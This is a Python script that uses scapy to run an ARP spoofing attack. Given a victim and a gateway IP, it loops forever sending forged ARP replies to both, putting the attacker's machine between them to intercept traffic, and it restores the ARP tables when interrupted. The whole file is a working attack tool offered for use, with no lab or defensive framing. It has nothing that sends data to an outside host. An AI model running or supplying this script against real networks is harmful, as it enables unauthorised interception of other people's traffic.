import scapy.all as scapy
import time
import optparse


def get_args():
    parser = optparse.OptionParser()
    parser.add_option('--target',
                      '-t',
                      '--victim',
                      '-v',
                      dest='target',
                      help='IP address of the target machine')
    parser.add_option('--gateway',
                      '-g',
                      dest='gateway',
                      help='Gateway IP address to spoof')
    (opts, args) = parser.parse_args()
    target_ip = opts.target
    gateway_ip = opts.gateway

    if not target_ip:
        target_ip = input('/-/ Enter IP address of target machine > ')
    if not gateway_ip:
        gateway_ip = input('/-/ Enter IP address of gateway to spoof > ')

    return target_ip, gateway_ip


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    ans_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return ans_list[0][1].hwsrc


def spoof(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)
    ether = scapy.Ether(dst=dest_mac, src=attacker_mac)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip)
    scapy.sendp(ether / packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    ether = scapy.Ether(dst=dest_mac, src=src_mac)
    packet = scapy.ARP(op=2,
                       pdst=dest_ip,
                       hwdst=dest_mac,
                       psrc=src_ip,
                       hwsrc=src_mac)
    scapy.sendp(ether / packet, count=4, verbose=False)


def main():
    (target_ip, gateway_ip) = get_args()

    sent_packets = 0

    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets = sent_packets + 2
            print(f'\r/+/ Total Packets Sent: {sent_packets}', end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\n/!/ Quitting ARP Spoofer.')
        print('/-/ Restoring ARP Records.')
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

main()